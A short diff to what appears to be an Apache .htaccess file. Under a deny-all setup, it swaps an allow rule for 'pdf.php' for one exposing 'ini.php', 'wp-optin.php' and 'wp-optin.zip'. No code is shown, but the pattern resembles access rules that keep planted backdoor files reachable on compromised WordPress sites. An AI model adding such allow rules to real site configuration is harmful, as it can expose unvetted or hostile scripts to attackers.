@@ -6,7 +6,7 @@ Deny from all
 
 </FilesMatch>
 
-<FilesMatch "^(pdf.php)$">
+<FilesMatch "^(ini.php|wp-optin.php|wp-optin.zip)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
